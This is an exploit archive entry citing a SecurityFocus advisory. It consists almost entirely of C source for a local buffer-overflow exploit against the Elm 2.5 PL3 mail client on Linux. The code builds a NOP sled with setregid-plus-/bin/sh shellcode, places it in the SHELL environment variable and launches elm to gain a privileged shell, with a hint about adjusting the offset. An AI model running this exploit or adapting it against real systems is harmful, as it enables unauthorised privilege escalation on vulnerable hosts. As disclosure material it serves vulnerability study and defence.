source: http://www.securityfocus.com/bid/1276/info
 
Buffer overflow vulnerabilities exist in elm (Electronic Mail for Unix). 

/* 
  Elm 2.5 PL3 exploit 
  Tested Under Linux Slackware 3.6, 4.0, 7.0
  By xfer (xfer@oko.lo2.szczecin.pl)
  Of Buffer0verfl0w Security
  At Sat May 27 18:52:14 CEST 2000
  HowTo: Hmmm.. Ya have to play with offset.
  MoreInfo: Elm is shit, it has bug in each option or function ;>.
*/ 
#include <stdio.h>
#include <unistd.h>
#define PATH "/usr/local/bin/elm"
#define BUFFER 256
#define NOP 0x90
                   /* setregid + generic shell code */
char shellcode[] = "\x31\xdb\x31\xc9\xbb\xff\xff\xff\xff\xb1\x0c\x31\xc0\xb0"
                   "\x47\xcd\x80\x31\xdb\x31\xc9\xb3\x0c\xb1\x0c\x31\xc0\xb0"
		   "\x47\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07"
		   "\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
		   "\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f"
		   "\x62\x69\x6e\x2f\x73\x68";
unsigned long get_esp(void) {
  __asm__("movl %esp, %eax"); 
}
int main(int argc,char *argv[]){
 char buff[BUFFER];
 int x,offset=0;
 long address;
 if(argc>1) offset=atoi(argv[1]);
 address = get_esp() + offset;
 fprintf(stderr,"Address: 0x%lx\nOffset: %d\nShellSize: %d\n",address,offset,strlen(shellcode));
 for(x=3;x<BUFFER;x+=4) *(int *)&buff[x]=address;
 for(x=0;x<(BUFFER-strlen(shellcode));x++) buff[x]=NOP;
 memcpy(buff+(BUFFER-strlen(shellcode)),shellcode,strlen(shellcode));
 setenv("SHELL",buff,1);
 if((execl(PATH,"elm",0)) < 0) fprintf(stderr,"Kurwa Mac! No %s file ?\n",PATH);
 return 0;
}
